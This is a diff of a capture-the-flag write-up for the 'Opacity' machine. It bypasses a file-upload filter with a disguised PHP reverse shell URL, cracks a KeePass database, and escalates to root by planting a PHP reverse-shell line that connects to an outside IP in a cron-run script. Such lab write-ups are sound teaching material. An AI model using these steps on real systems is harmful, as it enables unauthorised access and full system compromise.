@@ -24,7 +24,7 @@ Nmap done: 1 IP address (1 host up) scanned in 387.01 seconds")}}
 
 {{text("I visited the web page on port 80 and was presented a login page.")}}
 
-{{image("../../static/writeups/ohmyweb/images/000001.jpg")}}
+{{image("../../static/writeups/opacity/images/000001.jpg")}}
 
 {{text("I didn't have any credentials, so I continued with directory enumerating.")}}
 
@@ -54,7 +54,9 @@ Finished
 
 {{text("<code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>cloud</code> directory looked the most promising so I checked it out.")}}
 
-{{image("../../static/writeups/ohmyweb/images/000002.jpg")}}
+{{header("Shell as www-data", "shell-as-www-data")}}
+
+{{image("../../static/writeups/opacity/images/000002.jpg")}}
 
 {{text("It seemed like it was a file upload type of site.")}}
 
@@ -62,17 +64,17 @@ Finished
 
 {{text("I proceeded to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>revshells.com</code> and copied the PentestMonkey reverse shell into a file.")}}
 
-{{text("Then I hosted a web server by using python and downloaded the file that I saved.")}}
+{{text("Then I hosted a web server by using python and downloaded the reverse shell by using the website.")}}
 
 {{text("Uploading a file named <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>reverse.php</code> didn't seem to work.")}}
 
-{{text("There was probably a some type of filter in place so I modified the external URL to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>http://MY_IP/reverse.php .png</code> and it worked.")}}
+{{text("There was probably a some type of filter in place so I modified the external URL to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>http://MY_IP/reverse.php .png</code>.")}}
 
 {{text("After setting up a listener and visting the page the file was uploaded to, I got a connection.")}}
 
-{{image("../../static/writeups/ohmyweb/images/000003.jpg")}}
+{{image("../../static/writeups/opacity/images/000003.jpg")}}
 
-{{header}}
+{{header("Shell as sysadmin", "shell-as-sysadmin")}}
 
 {{text("After upgrading my shell, I began looking around the system.")}}
 
@@ -90,13 +92,13 @@ Finished
 
 {{text("I needed this database password in order to read it so I used <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>keepas2john</code>.")}}
 
-{{image("../../static/writeups/ohmyweb/images/000004.jpg")}}
+{{image("../../static/writeups/opacity/images/000004.jpg")}}
 
 {{text("After getting the password, I opened this file using KeePass and got credentials to user <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>sysadmin</code>.")}}
 
-{{image("../../static/writeups/ohmyweb/images/000005.jpg")}}
+{{image("../../static/writeups/opacity/images/000005.jpg")}}
 
-{{header}}
+{{header("Shell as root", "shell-as-root")}}
 
 {{text("After logging in via SSH, I found a <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>script.php</code> file inside of the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>scripts</code> folder.")}}
 
@@ -108,7 +110,7 @@ zipData('/home/sysadmin/scripts', '/var/backups/backup.zip');
 echo 'Successful', PHP_EOL;
 
 //Files scheduled removal
-$dir = "/var/www/html/cloud/images";
+$dir = '/var/www/html/cloud/images';
 if(file_exists($dir)){
     $di = new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS);
     $ri = new RecursiveIteratorIterator($di, RecursiveIteratorIterator::CHILD_FIRST);
@@ -135,7 +137,10 @@ drwxr-xr-x 3 root     root  4096 Jul  8  2022 ..
 
 {{text("I moved <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>backup.inc.php</code> to my home directory and edited it so that it would give me a reverse shell.")}}
 
-{{console("cat backup.inc.php", "$sock=fsockopen("10.9.6.6",1234);exec("bash <&3 >&3 2>&3");")}}
+{{console("cat backup.inc.php", "$sock=fsockopen('10.9.6.6',1234);exec('bash <&3 >&3 2>&3');")}}
 
-{{text("After that I moved it back to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>scripts/lib</code>, set up a listener and waited for a connection.")}}
+{{text("Then I moved it back to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>scripts/lib</code>, set up a listener and waited for a connection.")}}
 
+{{text("After some time, I got a reverse shell as root.")}}
+
+{{script()}}
